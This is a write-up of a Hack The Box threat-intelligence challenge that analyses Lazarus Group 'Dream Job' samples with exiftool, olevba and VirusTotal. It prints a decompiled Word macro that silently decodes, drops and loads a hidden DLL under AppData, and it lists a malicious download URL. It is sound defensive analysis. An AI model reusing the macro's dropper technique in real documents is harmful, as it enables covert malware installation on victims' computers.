- **Date**: Tuesday, May 12, 2026
- **Username**: cartofelplm
- **Difficulty**: Very Easy
- **Tags**: #Threat_Intelligence #APT #MITRE #TTP #Lazarus #DRATzarus #RAT #Torisma #Lz4_Compression #VEST-32_Encryption #Iso #Macros #Word 
- **Scenario**: As a Threat Intelligence Analyst investigating Operation Dream Job, you have identified that the Lazarus Group utilized a variety of custom-built malware and tools to facilitate their operations. Your task is to analyze and gather intelligence on the malware utilized by this APT.
- **Sherlock Info**: In this Sherlock players will continue with threat intelligence and analyze malware used by the Lazarus Group.
- **Official Writeup**: [here](https://htb-content-prod-private-storage.s3.eu-central-1.amazonaws.com/sherlocks/writeup/a06f1ac2-ee96-4bd5-917b-2bdf39133011.pdf?X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA47CRVXI3GZ5T5FNV%2F20260512%2Feu-central-1%2Fs3%2Faws4_request&X-Amz-Date=20260512T145656Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Signature=206fead4237bbc0e857373ce82f884b04dccf801066557aac4de055edae2c9fb)
- **Video Walkthrough**: [here](https://www.youtube.com/watch?v=pdQNlTqBzA0)
- **Impression**: quite interesting actually

---
# Artefacts

We extract the files from the archive and observe a text file that contains:

```
Dear User,

This text file is to warn you that the ZIP file contains software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments.

It is strongly recommend you proceed by:

1 - Running the sample in a controlled environment, for example EP Pwnbox or an isolated virtual machine.
2 - Only unzip the software in this controlled environment, using the password provided.
3 - Unzip the file in the VM and enjoy analysing!

PLEASE EXERCISE EXTREME CAUTION!

The ZIP file containing the software is password-protected for your safety. The password is “Dvn62WlNrt09”. It is strongly recommended that you do NOT extract or execute the contents of this ZIP file unless you understand the risks involved.
By reading this file and using the provided password to unzip the file, you acknowledge and fully understand the risks as detailed in this warning.
```

---
# Questions

1. According to MITRE ATT&CK, what previously known malware does DRATzarus share similarities with?

**Answer**: Bankshot

![[Dream Job-2-1778598202388.webp]]

2. Which Windows API function does DRATzarus use to detect the presence of a debugger?

**Answer**: IsDebuggerPresent

![[Dream Job-2-1778598246866.webp]]

3. Torisma is another piece of malware used by the Lazarus Group. According to MITRE, it has encrypted its C2 communications using XOR and which other method?

**Answer**: VEST-32

![[Dream Job-2-1778598596181.webp]]

4. Which packing method has been used to obfuscate Torisma?

**Answer**: lz4 compression

![[Dream Job-2-1778598682418.webp]]

5. Analyze the provided ISO file and identify the executable contained within it?

**Answer**: InternalViewer.exe

We mount the `.iso` file provided and find 2 files:

```
└─$ ls
BAE_HPC_SE.pdf  InternalViewer.exe
```

6. The executable found in the previous question was renamed. Can you identify its original name?

**Answer**: SumatraPDF.exe

We use the following command:

```
└─$ exiftool InternalViewer.exe 
ExifTool Version Number         : 13.25
File Name                       : InternalViewer.exe
Directory                       : .
File Size                       : 11 MB
File Modification Date/Time     : 2020:06:05 09:00:44+02:00
File Access Date/Time           : 2020:06:05 09:00:44+02:00
File Inode Change Date/Time     : 2020:06:05 09:00:44+02:00
File Permissions                : -r-xr-xr-x
File Type                       : Win64 EXE
File Type Extension             : exe
MIME Type                       : application/octet-stream
Machine Type                    : AMD AMD64
Time Stamp                      : 2020:05:12 21:26:17+02:00
Image File Characteristics      : Executable, Large address aware
PE Type                         : PE32+
Linker Version                  : 14.21
Code Size                       : 10465280
Initialized Data Size           : 45056
Uninitialized Data Size         : 34689024
Entry Point                     : 0x2b10580
OS Version                      : 6.0
Image Version                   : 0.0
Subsystem Version               : 6.0
Subsystem                       : Windows GUI
File Version Number             : 3.2.0.0
Product Version Number          : 3.2.0.0
File Flags Mask                 : 0x0000
File Flags                      : (none)
File OS                         : Windows NT 32-bit
Object File Type                : Executable application
File Subtype                    : 0
Language Code                   : English (U.S.)
Character Set                   : Windows, Latin1
File Description                : SumatraPDF
File Version                    : 3.2
Legal Copyright                 : Copyright 2006-2020 all authors (GPLv3)
Original File Name              : SumatraPDF.exe
Product Name                    : SumatraPDF
Product Version                 : 3.2
Company Name                    : Krzysztof Kowalczyk
```

7. According to VirusTotal, when was the EXE from the previous question First Seen In The Wild?(UTC)

**Answer**: 2020-08-13 08:44:50

![[Dream Job-2-1778601261613.webp]]

8. What packer was used to pack the executable from Question 6? (Full name)

**Answer**: Ultimate Packer for eXecutables

![[Dream Job-2-1778601578060.webp]]

9. What is the full URL found within the macro in the document Salary_Lockheed_Martin_job_opportunities_confidential.doc?

**Answer**: `https://markettrendingcenter.com/lk_job_oppor.docx`

We use the following command `olevba` from `oletools` package.

```
└─$ olevba Salary_Lockheed_Martin_job_opportunities_confidential.doc
...

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Frame1_Layout       |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Dridex Strings      |Dridex-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |https://markettrendi|URL                                          |
|          |ngcenter.com/lk_job_|                                             |
|          |oppor.docx          |                                             |
|IOC       |WMVCORE.DLL         |Executable file name                         |
|Base64    |+35H3CN79fCOR4N7ZzPs|KzM1SDNDTjc5ZkNPUjRON1p6UHNxVFhqYjJEeVZ3M3RlV|
|String    |qTXjb2DyVw3teTGkemQv|EdrZW1Rdk5DWG1FRERGZTFpakwzM2piNGc5eVkrRFRSMl|
|          |NCXmEDDFe1ijL33jb4g9|JlT0NL                                       |
|          |yY+DTR2ReOCK        |                                             |
|Base64    |8iH6aHsy9tkMHUWnk4E*|OGlINmFIc3k5dGtNSFVXbms0RSo0TnphT1JZMG4waHdJb|
|String    |4NzaORY0n0hwIlcSFJWA|GNTRkpXQU13RDIzV3Y0YllYd0psaXA2SlJzT2d1VXdvU1|
|          |MwD23Wv4bYXwJlip6JRs|gwS0ZW                                       |
|          |OguUwoSX0KFV        |                                             |
|Base64    |A5oDSLASdPbQZQYs1YR+|QTVvRFNMQVNkUGJRWlFZczFZUitYb3l0Nm9xakhuRUNuV|
|String    |Xoyt6oqjHnECnT4cFzHN|DRjRnpITmlzaVpPR3JLc012bHZXSGdzcWpOZVVzZE92UW|
|          |isiZOGrKsMvlvWHgsqjN|tPQXV5                                       |
|          |eUsdOvQkOAuy        |                                             |
|Dridex    |                    |iUXk6LABAABohlcNAL6ITg0AiUXgVuidAQAAaPqLNABWi|
|string    |                    |UXI6I8BAABoQjEOAFaJRczogQEAAIPEQIlF8Gg80TgAVu|
|          |                    |hwAQAA                                       |
+----------+--------------------+---------------------------------------------+

```

10. Who is the author of the document Salary_Lockheed_Martin_job_opportunities_confidential.doc?

**Answer**: Mickey

```
└─$ exiftool Salary_Lockheed_Martin_job_opportunities_confidential.doc 
ExifTool Version Number         : 13.25
File Name                       : Salary_Lockheed_Martin_job_opportunities_confidential.doc
Directory                       : .
File Size                       : 1294 kB
File Modification Date/Time     : 2025:03:05 17:10:08+01:00
File Access Date/Time           : 2026:05:12 18:20:49+02:00
File Inode Change Date/Time     : 2026:05:12 17:01:38+02:00
File Permissions                : -rw-rw-r--
File Type                       : DOC
File Type Extension             : doc
MIME Type                       : application/msword
Identification                  : Word 8.0
Language Code                   : English (US)
Doc Flags                       : Has picture, 1Table, ExtChar
System                          : Windows
Word 97                         : No
Title                           : 
Subject                         : 
Author                          : Mickey
Keywords                        : 
Comments                        : 
Template                        : Normal.dotm
Last Modified By                : Challenger
Software                        : Microsoft Office Word
Create Date                     : 2020:04:24 03:18:00
Modify Date                     : 2021:10:18 13:06:00
Security                        : None
Code Page                       : Windows Latin 1 (Western European)
Company                         : 
Char Count With Spaces          : 32
App Version                     : 16.0000
Scale Crop                      : No
Links Up To Date                : No
Shared Doc                      : No
Hyperlinks Changed              : No
Title Of Parts                  : 
Heading Pairs                   : Title, 1
Comp Obj User Type Len          : 32
Comp Obj User Type              : Microsoft Word 97-2003 Document
Last Printed                    : 0000:00:00 00:00:00
Revision Number                 : 83
Total Edit Time                 : 37 minutes
Words                           : 4
Characters                      : 29
Pages                           : 1
Paragraphs                      : 1
Lines                           : 1
```

11. Who last modified the above document?

**Answer**: Challenger

12. Analyze the "17.dotm" document. What is the directory where a suspicious folder was created? (Format: Give the path starting immediately after `<USER>`. Please pay attention to placeholder.)

**Answer**: \AppData\Local\Microsoft\Notice

We use the command `pcode2code` to get the raw code of the macro:

```
└─$ pcode2code 17.dotm    
```

```
stream : VBA/ThisDocument - 1188 bytes
########################################


stream : VBA/UserForm1 - 1821 bytes
########################################

Sub Label4_Click()
  
End Sub

Sub Label5_Click()
  
End Sub
stream : VBA/Module1 - 8317 bytes
########################################

Function sqlite3_stmt_all(ByVal lpDocPath As String) As Long
  Function LoadLibraryA(ByVal lpLibFileName As String) As Ptr
    
    Function MkDir(szDir)
      On Error Resume Next
      MkDir = CreateObject("Scripting.FileSystemObject").CreateFolder(szDir)
    End Function
    
    Function FileExist(szFile)
      On Error Resume Next
      FileExist = CreateObject("Scripting.FileSystemObject").FileExists(szFile)
    End Function
    
    Function FolderExist(szFolder)
      On Error Resume Next
      FolderExist = CreateObject("Scripting.FileSystemObject").FolderExists(szFolder)
    End Function
    
    Function Stream_BinaryToString(Binary)
      On Error Resume Next
      
      Const adTypeText = 2
      Const adTypeBinary = 1
      Dim BinaryStream
      Set BinaryStream = CreateObject("ADODB.Stream")
      BinaryStream.Type = adTypeBinary
      BinaryStream.Open
      BinaryStream.Write Binary
      BinaryStream.Position = 0
      BinaryStream.Type = adTypeText
      BinaryStream.Charset = "us-ascii"
      Stream_BinaryToString = BinaryStream.ReadText
      Set BinaryStream = Nothing
    End Function
    
    Function Base64DecodeToBinary(ByVal vCode)
      On Error Resume Next
      
      Dim oXML, oNode
      Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
      Set oNode = oXML.CreateElement("base64")
      oNode.dataType = "bin.base64"
      oNode.Text = vCode
      Base64DecodeToBinary = oNode.nodeTypedValue
      Set oNode = Nothing
      Set oXML = Nothing
    End Function
    
    Function Base64DecodeToString(ByVal vCode)
      On Error Resume Next
      
      Dim oXML, oNode
      Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
      Set oNode = oXML.CreateElement("base64")
      oNode.dataType = "bin.base64"
      oNode.Text = vCode
      Base64DecodeToString = Stream_BinaryToString(oNode.nodeTypedValue)
      Set oNode = Nothing
      Set oXML = Nothing
    End Function
    
    Sub ExtractDll(dllPath)
      On Error Resume Next
      
      Set objStream = CreateObject("ADODB.Stream")
      objStream.Type = 1
      objStream.Open
      #If Win64 Then
        objStream.Write Base64DecodeToBinary(Base64DecodeToString(UserForm1.Label1.Caption))
      #Else
        objStream.Write Base64DecodeToBinary(Base64DecodeToString(UserForm1.Label2.Caption))
      #End If
      objStream.SaveToFile dllPath, 2
      Set objStream = Nothing
    End Sub
    
    Sub ExtractDoc(docPath)
      On Error Resume Next
      
      Set objStream = CreateObject("ADODB.Stream")
      objStream.Type = 1
      objStream.Open
      objStream.Write Base64DecodeToBinary(Base64DecodeToString(UserForm1.Label3.Caption))
      objStream.SaveToFile docPath, 2
      Set objStream = Nothing
    End Sub
    
    Function GetDocName() As String
      On Error Resume Next
      
      strDocTag = " .doc"
      
      curDocNameFull = ActiveDocument.Path & "\" & ActiveDocument.Name
      curDocName = Left(curDocNameFull, InStrRev(curDocNameFull, ".") - 1)
      newDocNameFull = curDocName & strDocTag
      Do While FileExist(newDocNameFull)
        curDocName = curDocName & " "
        newDocNameFull = curDocName & strDocTag
      Loop
      GetDocName = newDocNameFull
    End Function
    
    Function GetDllName() As String
      On Error Resume Next
      Dim dllPath As String
      
      workDir = Environ("UserProfile") & "\AppData\Local\Microsoft\Notice"
      If Not FolderExist(workDir) Then
        MkDir(workDir)
      End If
      binName = "wsuser.db"
      binDir = "ws"
      
      dllPath = workDir & "\" & binName
      
      nIdx = 0
      Do While FileExist(dllPath)
        workDir = workDir & "\" & binDir
        If Not FolderExist(workDir) Then
          MkDir(workDir)
        End If
        dllPath = workDir & "\" & binName
      Loop
      
      GetDllName = dllPath
    End Function
    
    Sub AutoOpen()
      On Error Resume Next
      
      Application.Visible = False
      
      dllPath = GetDllName()
      docPath = GetDocName()
      orgDocPath = ActiveDocument.Path & "\" & ActiveDocument.Name
      
      ExtractDll(dllPath)
      ExtractDoc(docPath)
      
      LoadLibraryA(dllPath)
      
      a = sqlite3_stmt_all(orgDocPath, "S-6-81-3811-75432205-060098-6872", "17")
      
      Dim objDocApp
      Set objDocApp = CreateObject("Word.Application")
      objDocApp.Visible = True
      objDocApp.Documents.Open docPath
      
      Application.Quit(wdDoNotSaveChanges))
      
    End Sub
    

```

13. Which suspicious file was checked for existence in that directory?

**Answer**: wsuser.db

---
# Tools Used

List of tools used: #exiftool #olevba #mount #pcode2code #virusTotal

---